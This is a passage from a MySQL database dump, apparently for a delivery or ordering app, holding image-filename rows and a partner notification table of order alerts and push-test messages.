(9, 18, '1638433037image_picker6716346841363829240.jpg', '1638433043image_picker2452344927684745242.jpg', '1638433048image_picker1265494679509635801.jpg', 3),
(10, 20, '1638441895image_picker361968615176233455.jpg', '1638441936image_picker1543616586626005796.jpg', '1638442170image_picker3224754311066719699.jpg', 3),
(11, 19, '1638442102image_picker794430176325863146.jpg', '1638455576image_picker915301874899748128.jpg', '1638455843image_picker3416074748310002387.jpg', 3),
(12, 24, '1638443600image_picker7124227635936056418.jpg', '1638444556b6383e2a-3cec-44ce-9333-573713ec0a518332927635315460422.jpg', '1638444758image_picker9213316445284376626.jpg', 3),
(13, 21, '1638454133image_picker4927749280105335341.jpg', '1638454292image_picker8921644535526563797.jpg', '1638454410image_picker380743684566285841.jpg', 3),
(14, 26, '16384572797e038e26-fb63-4117-af2c-feace8421b827064858596946047251.jpg', '16384573053a8e4050-2f59-4e80-8985-80998b62e20d7190223845917872524.jpg', '1638457323image_picker5117386728613517328.jpg', 3),
(15, 25, '1638460415d7289257-7acb-4d8f-80dc-75779f57b9888720834347279326240.jpg', '1638460464cc27aaf8-9c0f-42af-82bb-3e79c532d4a32145423003324815712.jpg', '163850210793ee3e26-7ca4-4de6-8a2b-2616fecd331a108839366188967536.jpg', 3),
(16, 27, '163850450922911d28-1fb6-4803-a8bb-eceb4a8fb3a82708048590249363992.jpg', '1638504566ddb6fbab-55b9-4e52-b736-e780d20d989a3808165502197329074.jpg', '1638504614c095aa92-919c-481e-a788-b7dad835dc503603801762975244247.jpg', 3),
(17, 23, NULL, '1638516545382b306a-f9eb-42be-bdfb-21e58f5b76dc7456619025935353850.jpg', NULL, 1),
(18, 29, '1638769256image_picker3575525152858998553.jpg', '1638769269image_picker5250422967950240155.jpg', '1638769317image_picker2512812008772861888.jpg', 3),
(19, 31, '1638773099image_picker57276342713849659.jpg', '1638773114image_picker2963374409078902995.jpg', '1638773172image_picker2927742211408776253.jpg', 3),
(20, 30, '16389471599415a792-1d8b-4d4a-8708-f395651ee7fd5735770613570566976.jpg', '163894717381ff7074-9ef6-4e6e-81cb-9ada57ef12498567390654174952687.jpg', '16389471877c77cea5-1f79-47ce-bef2-c8ec5a23d6491980034434795513863.jpg', 3),
(21, 32, '1640000331image_picker2494547833299119379.jpg', '1640000456image_picker3172181472753862876.jpg', '1640000479image_picker9177945701910810359.jpg', 3),
(22, 34, '16400166585ba4566e-2d24-49ce-9818-8151693482831112485617255814751.jpg', '1640016783cdb2e334-334a-46a8-8da8-c0627f0753e4588065801925646313.jpg', '1640016816702f937a-0d11-43e0-971b-c458ed764d045421211069486854589.jpg', 3),
(23, 12, '1640621321image_picker3955430077302505071.jpg', '1640621315image_picker1435863295683673214.jpg', '1640621516image_picker4703123459440052919.jpg', 3),
(24, 36, '1641540605image_picker7553399462223496154.jpg', '1641540630image_picker5978835267886183799.jpg', '1641540647image_picker5743601639664965577.jpg', 3),
(25, 33, '1641995392image_picker6918889880514153395.jpg', '1641995196image_picker5733386598092305928.jpg', '1641995021image_picker5173386937970585543.jpg', 3);

-- --------------------------------------------------------

--
-- Table structure for table `tbl_partner_notification`
--

CREATE TABLE `tbl_partner_notification` (
  `id` bigint(20) NOT NULL,
  `pid` bigint(20) NOT NULL,
  `datetime` datetime NOT NULL,
  `title` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `description` text COLLATE utf8mb4_unicode_ci NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `tbl_partner_notification`
--

INSERT INTO `tbl_partner_notification` (`id`, `pid`, `datetime`, `title`, `description`) VALUES
(1, 2, '2021-12-05 23:19:49', 'New order', 'You got a new order.OrderId:1'),
(2, 2, '2021-12-05 23:30:52', 'You accepted order', 'You accepted order.Order id: 1'),
(3, 2, '2021-12-05 23:30:58', 'You completed order', 'You completed order.Order id: 1'),
(4, 2, '2021-12-05 23:34:33', 'New order', 'You got a new order.OrderId:2'),
(5, 4, '2021-12-05 23:34:33', 'New order', 'You got a new order.OrderId:2'),
(6, 4, '2021-12-05 23:35:15', 'New order', 'You got a new order.OrderId:3'),
(7, 2, '2021-12-06 00:18:49', 'New order', 'You got a new order.OrderId:10'),
(8, 2, '2021-12-06 04:22:43', 'New order', 'You got a new order.OrderId:14'),
(9, 4, '2021-12-06 04:22:43', 'New order', 'You got a new order.OrderId:14'),
(10, 4, '2021-12-06 04:28:17', 'New order', 'You got a new order.OrderId:15'),
(11, 21, '2021-12-06 06:16:42', 'Order cancelled', 'Order cancelled. Order id: 16'),
(12, 21, '2021-12-06 06:16:44', 'Order cancelled', 'Order cancelled. Order id: 17'),
(13, 2, '2021-12-06 16:27:58', 'New order', 'You got a new order.OrderId:18'),
(14, 4, '2021-12-06 16:27:58', 'New order', 'You got a new order.OrderId:18'),
(15, 29, '2021-12-06 16:27:58', 'New order', 'You got a new order.OrderId:18'),
(16, 2, '2021-12-06 18:26:30', 'New order', 'You got a new order.OrderId:19'),
(17, 29, '2021-12-06 18:26:30', 'New order', 'You got a new order.OrderId:19'),
(18, 2, '2021-12-07 04:05:01', 'New order', 'You got a new order.OrderId:20'),
(19, 4, '2021-12-07 04:05:01', 'New order', 'You got a new order.OrderId:20'),
(20, 29, '2021-12-07 04:05:01', 'New order', 'You got a new order.OrderId:20'),
(21, 2, '2021-12-07 18:06:18', 'New order', 'You got a new order.OrderId:24'),
(22, 4, '2021-12-07 18:06:18', 'New order', 'You got a new order.OrderId:24'),
(23, 29, '2021-12-07 18:06:18', 'New order', 'You got a new order.OrderId:24'),
(24, 2, '2021-12-07 18:43:26', 'New order', 'You got a new order.OrderId:26'),
(25, 4, '2021-12-07 18:43:26', 'New order', 'You got a new order.OrderId:26'),
(26, 29, '2021-12-07 18:43:26', 'New order', 'You got a new order.OrderId:26'),
(27, 2, '2021-12-07 18:44:33', 'New order', 'You got a new order.OrderId:27'),
(28, 4, '2021-12-07 18:44:33', 'New order', 'You got a new order.OrderId:27'),
(29, 29, '2021-12-07 18:44:33', 'New order', 'You got a new order.OrderId:27'),
(30, 2, '2021-12-08 16:50:05', 'New order', 'You got a new order.OrderId:28'),
(31, 2, '2021-12-08 17:23:02', 'New order', 'You got a new order.OrderId:29'),
(32, 2, '2021-12-08 17:51:54', 'New order', 'You got a new order.OrderId:30'),
(33, 4, '2021-12-08 19:14:17', 'New order', 'You got a new order.OrderId:31'),
(34, 4, '2021-12-08 19:22:12', 'You accepted order', 'You accepted order.Order id: 31'),
(35, 2, '2021-12-09 06:08:57', 'New order', 'You got a new order.OrderId:32'),
(36, 4, '2021-12-09 06:08:57', 'New order', 'You got a new order.OrderId:32'),
(37, 29, '2021-12-09 06:08:57', 'New order', 'You got a new order.OrderId:32'),
(38, 4, '2021-12-09 06:59:11', 'New order', 'You got a new order.OrderId:43'),
(39, 21, '2021-12-09 07:37:23', 'Order cancelled', 'Order cancelled. Order id: 39'),
(40, 21, '2021-12-09 07:37:27', 'Order cancelled', 'Order cancelled. Order id: 40'),
(41, 21, '2021-12-09 07:37:36', 'Order cancelled', 'Order cancelled. Order id: 41'),
(42, 21, '2021-12-09 07:37:43', 'Order cancelled', 'Order cancelled. Order id: 35'),
(43, 21, '2021-12-09 07:37:44', 'Order cancelled', 'Order cancelled. Order id: 34'),
(44, 21, '2021-12-09 07:37:47', 'Order cancelled', 'Order cancelled. Order id: 33'),
(45, 21, '2021-12-09 07:37:56', 'Order cancelled', 'Order cancelled. Order id: 38'),
(46, 21, '2021-12-09 07:37:58', 'Order cancelled', 'Order cancelled. Order id: 37'),
(47, 21, '2021-12-09 07:38:02', 'Order cancelled', 'Order cancelled. Order id: 36'),
(48, 27, '2021-12-09 07:38:06', 'Order cancelled', 'Order cancelled. Order id: 22'),
(49, 27, '2021-12-09 07:38:07', 'Order cancelled', 'Order cancelled. Order id: 21'),
(50, 25, '2021-12-09 07:56:42', 'New order', 'You got a new order.OrderId:51'),
(51, 4, '2021-12-09 07:56:42', 'New order', 'You got a new order.OrderId:51'),
(52, 25, '2021-12-09 08:11:48', 'New order', 'You got a new order.OrderId:52'),
(53, 4, '2021-12-09 08:11:48', 'New order', 'You got a new order.OrderId:52'),
(54, 21, '2021-12-09 08:40:52', 'Order cancelled', 'Order cancelled. Order id: 44'),
(55, 2, '2021-12-09 13:58:37', 'New order', 'You got a new order.OrderId:53'),
(56, 2, '2021-12-09 14:47:20', 'New order', 'You got a new order.OrderId:54'),
(57, 2, '2021-12-09 14:52:59', 'New order', 'You got a new order.OrderId:55'),
(58, 2, '2021-12-09 15:24:53', 'New order', 'You got a new order.OrderId:56'),
(59, 2, '2021-12-09 16:51:04', 'New order', 'You got a new order.OrderId:57'),
(60, 2, '2021-12-09 18:56:23', 'New order', 'You got a new order.OrderId:58'),
(61, 2, '2021-12-09 18:57:57', 'New order', 'You got a new order.OrderId:59'),
(62, 2, '2021-12-10 01:29:10', 'New order', 'You got a new order.OrderId:60'),
(63, 2, '2021-12-10 01:33:41', 'New order', 'You got a new order.OrderId:61'),
(64, 2, '2021-12-10 01:35:10', 'New order', 'You got a new order.OrderId:62'),
(65, 2, '2021-12-10 01:50:32', 'New order', 'You got a new order.OrderId:63'),
(66, 2, '2021-12-10 02:04:28', 'New order', 'You got a new order.OrderId:64'),
(67, 2, '2021-12-10 02:15:05', 'New order', 'You got a new order.OrderId:65'),
(68, 2, '2021-12-10 02:25:09', 'New order', 'You got a new order.OrderId:66'),
(69, 2, '2021-12-10 02:31:24', 'New order', 'You got a new order.OrderId:67'),
(70, 2, '2021-12-10 02:34:01', 'New order', 'You got a new order.OrderId:68'),
(71, 2, '2021-12-10 02:38:15', 'New order', 'You got a new order.OrderId:69'),
(72, 25, '2021-12-10 03:10:15', 'New order', 'You got a new order.OrderId:70'),
(73, 4, '2021-12-10 03:10:15', 'New order', 'You got a new order.OrderId:70'),
(74, 25, '2021-12-10 04:51:15', 'New order', 'You got a new order.OrderId:71'),
(75, 4, '2021-12-10 04:51:15', 'New order', 'You got a new order.OrderId:71'),
(76, 25, '2021-12-10 04:52:52', 'New order', 'You got a new order.OrderId:72'),
(77, 4, '2021-12-10 04:55:48', 'New order', 'You got a new order.OrderId:73'),
(78, 4, '2021-12-10 05:22:43', 'New order', 'You got a new order.OrderId:74'),
(79, 2, '2021-12-10 05:41:03', 'New order', 'You got a new order.OrderId:75'),
(80, 2, '2021-12-10 05:58:41', 'New order', 'You got a new order.OrderId:76'),
(81, 4, '2021-12-10 05:58:41', 'New order', 'You got a new order.OrderId:76'),
(82, 29, '2021-12-10 05:58:41', 'New order', 'You got a new order.OrderId:76'),
(83, 2, '2021-12-10 06:00:44', 'New order', 'You got a new order.OrderId:77'),
(84, 25, '2021-12-10 06:04:19', 'New order', 'You got a new order.OrderId:78'),
(85, 4, '2021-12-10 06:04:19', 'New order', 'You got a new order.OrderId:78'),
(86, 2, '2021-12-10 07:08:02', 'New order', 'You got a new order.OrderId:79'),
(87, 25, '2021-12-10 07:12:02', 'New order', 'You got a new order.OrderId:80'),
(88, 4, '2021-12-10 07:12:02', 'New order', 'You got a new order.OrderId:80'),
(89, 25, '2021-12-10 07:40:08', 'New order', 'You got a new order.OrderId:81'),
(90, 4, '2021-12-10 07:40:08', 'New order', 'You got a new order.OrderId:81'),
(91, 25, '2021-12-10 07:51:24', 'New order', 'You got a new order.OrderId:82'),
(92, 4, '2021-12-10 07:51:24', 'New order', 'You got a new order.OrderId:82'),
(93, 25, '2021-12-10 07:57:36', 'New order', 'You got a new order.OrderId:83'),
(94, 4, '2021-12-10 07:57:36', 'New order', 'You got a new order.OrderId:83'),
(95, 25, '2021-12-10 08:03:15', 'New order', 'You got a new order.OrderId:84'),
(96, 4, '2021-12-10 08:03:15', 'New order', 'You got a new order.OrderId:84'),
(97, 25, '2021-12-10 08:14:23', 'New order', 'You got a new order.OrderId:85'),
(98, 4, '2021-12-10 08:14:23', 'New order', 'You got a new order.OrderId:85'),
(99, 25, '2021-12-10 11:37:09', 'New order', 'You got a new order.OrderId:86'),
(100, 4, '2021-12-10 11:37:09', 'New order', 'You got a new order.OrderId:86'),
(101, 25, '2021-12-10 13:02:38', 'New order', 'You got a new order.OrderId:87'),
(102, 4, '2021-12-10 13:02:38', 'New order', 'You got a new order.OrderId:87'),
(103, 25, '2021-12-10 13:04:09', 'New order', 'You got a new order.OrderId:88'),
(104, 4, '2021-12-10 13:04:09', 'New order', 'You got a new order.OrderId:88'),
(105, 25, '2021-12-10 13:05:01', 'New order', 'You got a new order.OrderId:89'),
(106, 4, '2021-12-10 13:05:01', 'New order', 'You got a new order.OrderId:89'),
(107, 25, '2021-12-10 13:10:26', 'New order', 'You got a new order.OrderId:90'),
(108, 4, '2021-12-10 13:10:26', 'New order', 'You got a new order.OrderId:90'),
(109, 25, '2021-12-10 13:14:06', 'New order', 'You got a new order.OrderId:91'),
(110, 4, '2021-12-10 13:14:06', 'New order', 'You got a new order.OrderId:91'),
(111, 25, '2021-12-10 13:15:06', 'New order', 'You got a new order.OrderId:92'),
(112, 4, '2021-12-10 13:15:06', 'New order', 'You got a new order.OrderId:92'),
(113, 4, '2021-12-10 13:17:17', 'You completed order', 'You completed order.Order id: 92'),
(114, 2, '2021-12-10 13:36:36', 'New order', 'You got a new order.OrderId:94'),
(115, 4, '2021-12-10 13:36:36', 'New order', 'You got a new order.OrderId:94'),
(116, 4, '2021-12-10 13:37:10', 'You accepted order', 'You accepted order.Order id: 94'),
(117, 4, '2021-12-10 13:37:28', 'You completed order', 'You completed order.Order id: 94'),
(118, 25, '2021-12-10 14:36:52', 'New order', 'You got a new order.OrderId:95'),
(119, 4, '2021-12-10 14:36:52', 'New order', 'You got a new order.OrderId:95'),
(120, 25, '2021-12-10 14:40:17', 'New order', 'You got a new order.OrderId:96'),
(121, 25, '2021-12-10 15:06:37', 'New order', 'You got a new order.OrderId:97'),
(122, 4, '2021-12-10 15:06:37', 'New order', 'You got a new order.OrderId:97'),
(123, 25, '2021-12-10 15:16:32', 'New order', 'You got a new order.OrderId:98'),
(124, 4, '2021-12-10 15:16:32', 'New order', 'You got a new order.OrderId:98'),
(125, 25, '2021-12-10 16:38:05', 'New order', 'You got a new order.OrderId:99'),
(126, 4, '2021-12-10 16:38:05', 'New order', 'You got a new order.OrderId:99'),
(127, 25, '2021-12-10 16:43:06', 'New order', 'You got a new order.OrderId:100'),
(128, 4, '2021-12-10 16:43:06', 'New order', 'You got a new order.OrderId:100'),
(129, 25, '2021-12-10 17:02:27', 'New order', 'You got a new order.OrderId:101'),
(130, 4, '2021-12-10 17:02:27', 'New order', 'You got a new order.OrderId:101'),
(131, 25, '2021-12-10 17:11:48', 'New order', 'You got a new order.OrderId:102'),
(132, 4, '2021-12-10 17:11:48', 'New order', 'You got a new order.OrderId:102'),
(133, 25, '2021-12-10 17:20:27', 'New order', 'You got a new order.OrderId:103'),
(134, 4, '2021-12-10 17:20:27', 'New order', 'You got a new order.OrderId:103'),
(135, 25, '2021-12-10 18:41:05', 'New order', 'You got a new order.OrderId:104'),
(136, 4, '2021-12-10 18:41:05', 'New order', 'You got a new order.OrderId:104'),
(137, 2, '2021-12-10 18:57:04', 'New order', 'You got a new order.OrderId:105'),
(138, 4, '2021-12-10 18:57:04', 'New order', 'You got a new order.OrderId:105'),
(139, 29, '2021-12-10 18:57:04', 'New order', 'You got a new order.OrderId:105'),
(140, 25, '2021-12-10 18:59:01', 'New order', 'You got a new order.OrderId:106'),
(141, 4, '2021-12-10 18:59:01', 'New order', 'You got a new order.OrderId:106'),
(142, 2, '2021-12-10 19:04:14', 'New order', 'You got a new order.OrderId:107'),
(143, 4, '2021-12-10 19:04:14', 'New order', 'You got a new order.OrderId:107'),
(144, 29, '2021-12-10 19:04:14', 'New order', 'You got a new order.OrderId:107'),
(145, 2, '2021-12-10 19:06:11', 'New order', 'You got a new order.OrderId:108'),
(146, 4, '2021-12-10 19:06:11', 'New order', 'You got a new order.OrderId:108'),
(147, 29, '2021-12-10 19:06:11', 'New order', 'You got a new order.OrderId:108'),
(148, 4, '2021-12-10 19:06:48', 'You accepted order', 'You accepted order.Order id: 108'),
(149, 4, '2021-12-10 19:06:58', 'You completed order', 'You completed order.Order id: 108'),
(150, 2, '2021-12-10 19:28:51', 'New order', 'You got a new order.OrderId:109'),
(151, 4, '2021-12-10 19:28:51', 'New order', 'You got a new order.OrderId:109'),
(152, 29, '2021-12-10 19:28:51', 'New order', 'You got a new order.OrderId:109'),
(153, 25, '2021-12-10 19:30:08', 'New order', 'You got a new order.OrderId:110'),
(154, 4, '2021-12-10 19:30:08', 'New order', 'You got a new order.OrderId:110'),
(155, 2, '2021-12-10 19:38:40', 'New order', 'You got a new order.OrderId:111'),
(156, 2, '2021-12-10 19:42:51', 'New order', 'You got a new order.OrderId:112'),
(157, 2, '2021-12-10 20:28:36', 'New order', 'You got a new order.OrderId:113'),
(158, 2, '2021-12-10 20:30:55', 'New order', 'You got a new order.OrderId:114'),
(159, 21, '2021-12-11 06:47:26', 'Order cancelled', 'Order cancelled. Order id: 115'),
(160, 25, '2021-12-11 16:53:07', 'New order', 'You got a new order.OrderId:117'),
(161, 4, '2021-12-11 16:53:07', 'New order', 'You got a new order.OrderId:117'),
(162, 2, '2021-12-11 16:56:25', 'New order', 'You got a new order.OrderId:118'),
(163, 2, '2021-12-11 16:56:44', 'You accepted order', 'You accepted order.Order id: 118'),
(164, 2, '2021-12-11 17:08:59', 'New order', 'You got a new order.OrderId:119'),
(165, 2, '2021-12-11 17:17:56', 'New order', 'You got a new order.OrderId:120'),
(166, 2, '2021-12-11 17:23:31', 'New order', 'You got a new order.OrderId:121'),
(167, 2, '2021-12-11 17:26:24', 'New order', 'You got a new order.OrderId:122'),
(168, 2, '2021-12-11 17:31:54', 'New order', 'You got a new order.OrderId:123'),
(169, 2, '2021-12-11 17:38:51', 'New order', 'You got a new order.OrderId:124'),
(170, 2, '2021-12-11 17:43:14', 'New order', 'You got a new order.OrderId:125'),
(171, 25, '2021-12-12 06:25:28', 'New order', 'You got a new order.OrderId:126'),
(172, 4, '2021-12-12 06:25:28', 'New order', 'You got a new order.OrderId:126'),
(173, 4, '2021-12-12 06:28:06', 'You completed order', 'You completed order.Order id: 126'),
(174, 25, '2021-12-12 06:59:21', 'New order', 'You got a new order.OrderId:127'),
(175, 4, '2021-12-12 06:59:21', 'New order', 'You got a new order.OrderId:127'),
(176, 4, '2021-12-12 07:02:00', 'You accepted order', 'You accepted order.Order id: 127'),
(177, 4, '2021-12-12 07:04:28', 'You completed order', 'You completed order.Order id: 127'),
(178, 2, '2021-12-12 16:15:49', 'Hi', 'test'),
(179, 2, '2021-12-12 16:18:06', 'Hi', 'test'),
(180, 2, '2021-12-12 16:18:26', 'Hi', 'test'),
(181, 2, '2021-12-12 16:19:09', 'Hi', 'test'),
(182, 2, '2021-12-12 17:55:09', 'Hi', 'test'),
(183, 2, '2021-12-12 18:26:35', 'Hi', 'push test'),
(184, 2, '2021-12-12 18:30:10', 'Hi', 'push test'),
(185, 2, '2021-12-12 18:30:36', 'Hi', 'push test'),
(186, 2, '2021-12-12 18:35:46', 'Hi', 'push test'),
(187, 2, '2021-12-12 18:43:34', 'Hi', 'push test'),
(188, 2, '2021-12-12 18:52:08', 'Hi', 'push test'),
(189, 2, '2021-12-12 20:50:11', 'New order', 'You got a new order.OrderId:128'),
(190, 2, '2021-12-12 20:51:01', 'New order', 'You got a new order.OrderId:129'),
(191, 2, '2021-12-12 21:09:24', 'New order', 'You got a new order.OrderId:130'),
(192, 2, '2021-12-12 22:03:28', 'New order', 'You got a new order.OrderId:131'),
(193, 25, '2021-12-13 05:07:06', 'New order', 'You got a new order.OrderId:132'),
(194, 4, '2021-12-13 05:07:06', 'New order', 'You got a new order.OrderId:132'),
(195, 4, '2021-12-13 05:07:48', 'You accepted order', 'You accepted order.Order id: 132'),
(196, 4, '2021-12-13 05:08:13', 'You completed order', 'You completed order.Order id: 132'),
(197, 4, '2021-12-13 05:23:49', 'New order', 'You got a new order.OrderId:133'),
(198, 25, '2021-12-13 05:23:49', 'New order', 'You got a new order.OrderId:133'),
(199, 4, '2021-12-13 05:24:15', 'You accepted order', 'You accepted order.Order id: 133'),
(200, 4, '2021-12-13 05:27:31', 'You completed order', 'You completed order.Order id: 133'),
(201, 2, '2021-12-13 05:37:27', 'New order', 'You got a new order.OrderId:134'),
(202, 4, '2021-12-13 05:37:27', 'New order', 'You got a new order.OrderId:134'),
(203, 29, '2021-12-13 05:37:27', 'New order', 'You got a new order.OrderId:134'),
(204, 4, '2021-12-13 05:37:52', 'You accepted order', 'You accepted order.Order id: 134'),
(205, 4, '2021-12-13 05:37:59', 'You completed order', 'You completed order.Order id: 134'),
(206, 2, '2021-12-13 05:44:54', 'New order', 'You got a new order.OrderId:135'),
(207, 2, '2021-12-13 05:45:33', 'You accepted order', 'You accepted order.Order id: 135'),
(208, 2, '2021-12-13 05:46:41', 'You completed order', 'You completed order.Order id: 135'),
(209, 4, '2021-12-13 06:10:02', 'New order', 'You got a new order.OrderId:138'),
(210, 25, '2021-12-13 06:10:02', 'New order', 'You got a new order.OrderId:138'),
(211, 4, '2021-12-13 06:10:34', 'You accepted order', 'You accepted order.Order id: 138'),
(212, 4, '2021-12-13 06:10:41', 'You completed order', 'You completed order.Order id: 138'),
(213, 2, '2021-12-13 06:17:15', 'New order', 'You got a new order.OrderId:139'),
(214, 4, '2021-12-13 06:17:15', 'New order', 'You got a new order.OrderId:139'),
(215, 29, '2021-12-13 06:17:15', 'New order', 'You got a new order.OrderId:139'),
(216, 4, '2021-12-13 06:24:54', 'New order', 'You got a new order.OrderId:140'),
(217, 25, '2021-12-13 06:24:54', 'New order', 'You got a new order.OrderId:140'),
(218, 4, '2021-12-13 06:25:18', 'You accepted order', 'You accepted order.Order id: 140'),
(219, 4, '2021-12-13 06:25:27', 'You completed order', 'You completed order.Order id: 140'),
(220, 4, '2021-12-13 06:38:30', 'New order', 'You got a new order.OrderId:141'),
(221, 25, '2021-12-13 06:38:30', 'New order', 'You got a new order.OrderId:141'),
(222, 4, '2021-12-13 06:39:02', 'You accepted order', 'You accepted order.Order id: 141'),
(223, 4, '2021-12-13 06:39:08', 'You completed order', 'You completed order.Order id: 141'),
(224, 30, '2021-12-13 09:00:39', 'You completed order', 'You completed order.Order id: 144'),
(225, 2, '2021-12-13 09:57:57', 'Hi', 'push test'),
(226, 2, '2021-12-13 09:58:47', 'Hi', 'push test'),
(227, 2, '2021-12-13 10:05:41', 'Hi', 'push test'),
(228, 2, '2021-12-13 10:06:02', 'Hi', 'push test'),
(229, 2, '2021-12-13 10:20:49', 'New order', 'You got a new order.OrderId:145'),
(230, 2, '2021-12-13 10:52:32', 'New order', 'You got a new order.OrderId:1'),
(231, 2, '2021-12-13 10:54:14', 'You accepted order', 'You accepted order.Order id: 1'),
(232, 2, '2021-12-13 10:54:35', 'You completed order', 'You completed order.Order id: 1'),
(233, 2, '2021-12-13 13:34:10', 'New order', 'You got a new order.OrderId:2'),
(234, 4, '2021-12-13 13:34:10', 'New order', 'You got a new order.OrderId:2'),
(235, 29, '2021-12-13 13:34:10', 'New order', 'You got a new order.OrderId:2'),
(236, 2, '2021-12-13 14:15:39', 'Hi', 'push test'),
(237, 2, '2021-12-13 14:15:58', 'Hi', 'push test'),
(238, 2, '2021-12-13 14:25:12', 'Hello', 'push test'),
(239, 2, '2021-12-13 14:33:25', 'Hello', 'push test'),
(240, 2, '2021-12-13 14:33:51', 'Hello', 'push test'),
(241, 2, '2021-12-13 14:36:27', 'Hello', 'push test'),
(242, 2, '2021-12-13 14:47:08', 'Hello', 'push test'),
(243, 2, '2021-12-13 14:57:09', 'Hello', 'push test'),
(244, 4, '2021-12-13 15:45:00', 'New order', 'You got a new order.OrderId:3'),
(245, 25, '2021-12-13 15:45:00', 'New order', 'You got a new order.OrderId:3'),
(246, 2, '2021-12-13 15:45:49', 'New order', 'You got a new order.OrderId:4'),
(247, 4, '2021-12-13 15:45:49', 'New order', 'You got a new order.OrderId:4'),
(248, 2, '2021-12-13 15:46:17', 'New order', 'You got a new order.OrderId:5'),
(249, 4, '2021-12-13 15:46:17', 'New order', 'You got a new order.OrderId:5'),
(250, 29, '2021-12-13 15:46:17', 'New order', 'You got a new order.OrderId:5'),
(251, 4, '2021-12-13 15:51:05', 'You accepted order', 'You accepted order.Order id: 3'),
(252, 4, '2021-12-13 15:51:12', 'You completed order', 'You completed order.Order id: 3'),
(253, 4, '2021-12-13 15:55:44', 'New order', 'You got a new order.OrderId:6'),
(254, 25, '2021-12-13 15:55:44', 'New order', 'You got a new order.OrderId:6'),
(255, 4, '2021-12-13 15:56:56', 'You accepted order', 'You accepted order.Order id: 6'),
(256, 4, '2021-12-13 15:57:34', 'You completed order', 'You completed order.Order id: 6'),
(257, 4, '2021-12-13 17:22:09', 'New order', 'You got a new order.OrderId:1'),
(258, 25, '2021-12-13 17:22:09', 'New order', 'You got a new order.OrderId:1'),
(259, 4, '2021-12-13 17:23:54', 'You accepted order', 'You accepted order.Order id: 1'),
(260, 4, '2021-12-13 17:24:38', 'You completed order', 'You completed order.Order id: 1'),
(261, 2, '2021-12-14 05:19:24', 'Hi', 'push test'),
(262, 2, '2021-12-14 05:19:56', 'Hi', 'push test'),
(263, 2, '2021-12-14 05:22:31', 'Hi', 'push test'),
(264, 2, '2021-12-14 05:24:05', 'New order', 'You got a new order.OrderId:2'),
(265, 4, '2021-12-14 05:24:05', 'New order', 'You got a new order.OrderId:2'),
(266, 29, '2021-12-14 05:24:05', 'New order', 'You got a new order.OrderId:2'),
(267, 4, '2021-12-14 05:25:42', 'You accepted order', 'You accepted order.Order id: 2'),
(268, 4, '2021-12-14 05:25:56', 'You completed order', 'You completed order.Order id: 2'),
(269, 2, '2021-12-14 05:34:26', 'Hi', 'push test'),
(270, 4, '2021-12-14 06:27:38', 'New order', 'You got a new order.OrderId:3'),
(271, 25, '2021-12-14 06:27:38', 'New order', 'You got a new order.OrderId:3'),
(272, 2, '2021-12-14 17:06:19', 'new push', 'Hi'),
(273, 2, '2021-12-14 17:06:25', 'new push', 'Hi'),
(274, 2, '2021-12-14 17:06:42', 'new push', 'Hi'),
(275, 2, '2021-12-14 17:10:17', 'new push', 'Hi'),
(276, 2, '2021-12-14 18:28:14', 'new push', 'Hi'),
(277, 2, '2021-12-14 18:42:11', 'Hi', 'push test'),
(278, 2, '2021-12-14 18:45:36', 'Hi', 'push test'),
(279, 2, '2021-12-14 18:47:56', 'Hi', 'push test'),
(280, 2, '2021-12-14 19:04:36', 'Hi', 'push test'),
(281, 2, '2021-12-14 19:05:14', 'Hi', 'push test'),
(282, 2, '2021-12-14 19:08:04', 'Hi', 'push test'),
(283, 2, '2021-12-14 19:08:10', 'Hi', 'push test'),
(284, 2, '2021-12-14 19:13:05', 'Hi', 'push test'),
(285, 2, '2021-12-14 19:13:56', 'Hi', 'push test'),
(286, 2, '2021-12-15 15:00:44', 'New order', 'You got a new order.OrderId:4'),
(287, 4, '2021-12-15 15:00:44', 'New order', 'You got a new order.OrderId:4'),
(288, 29, '2021-12-15 15:00:44', 'New order', 'You got a new order.OrderId:4'),
(289, 4, '2021-12-15 15:01:35', 'You accepted order', 'You accepted order.Order id: 4'),
(290, 4, '2021-12-15 15:02:02', 'You completed order', 'You completed order.Order id: 4'),
(291, 2, '2021-12-15 16:59:52', 'New order', 'You got a new order.OrderId:5'),
(292, 4, '2021-12-15 16:59:52', 'New order', 'You got a new order.OrderId:5'),
(293, 29, '2021-12-15 16:59:52', 'New order', 'You got a new order.OrderId:5'),
(294, 4, '2021-12-15 17:21:40', 'You accepted order', 'You accepted order.Order id: 5'),
(295, 4, '2021-12-15 17:23:57', 'You completed order', 'You completed order.Order id: 5'),
(296, 4, '2021-12-15 17:24:35', 'You completed order', 'You completed order.Order id: 3'),
(297, 4, '2021-12-15 17:34:20', 'You completed order', 'You completed order.Order id: 3'),
(298, 4, '2021-12-15 17:35:33', 'You completed order', 'You completed order.Order id: 3'),
(299, 2, '2021-12-15 17:37:58', 'New order', 'You got a new order.OrderId:6'),
(300, 4, '2021-12-15 17:37:58', 'New order', 'You got a new order.OrderId:6'),
(301, 29, '2021-12-15 17:37:58', 'New order', 'You got a new order.OrderId:6'),
(302, 30, '2021-12-15 17:37:58', 'New order', 'You got a new order.OrderId:6'),
(303, 4, '2021-12-15 17:38:15', 'You accepted order', 'You accepted order.Order id: 6'),
(304, 4, '2021-12-15 17:38:23', 'You completed order', 'You completed order.Order id: 6'),
(305, 2, '2021-12-15 17:51:35', 'New order', 'You got a new order.OrderId:7'),
(306, 4, '2021-12-15 17:51:35', 'New order', 'You got a new order.OrderId:7'),
(307, 29, '2021-12-15 17:51:35', 'New order', 'You got a new order.OrderId:7'),
(308, 30, '2021-12-15 17:51:35', 'New order', 'You got a new order.OrderId:7'),
(309, 30, '2021-12-15 17:52:26', 'You accepted order', 'You accepted order.Order id: 7'),
(310, 30, '2021-12-15 17:58:23', 'You completed order', 'You completed order.Order id: 7'),
(311, 2, '2021-12-16 06:37:51', 'New order', 'You got a new order.OrderId:8'),
(312, 4, '2021-12-16 06:37:51', 'New order', 'You got a new order.OrderId:8'),
(313, 29, '2021-12-16 06:37:51', 'New order', 'You got a new order.OrderId:8'),
(314, 30, '2021-12-16 06:37:51', 'New order', 'You got a new order.OrderId:8'),
(315, 30, '2021-12-16 06:38:08', 'You accepted order', 'You accepted order.Order id: 8'),
(316, 30, '2021-12-16 06:41:07', 'You completed order', 'You completed order.Order id: 8'),
(317, 4, '2021-12-16 06:52:38', 'New order', 'You got a new order.OrderId:9'),
(318, 25, '2021-12-16 06:52:38', 'New order', 'You got a new order.OrderId:9'),
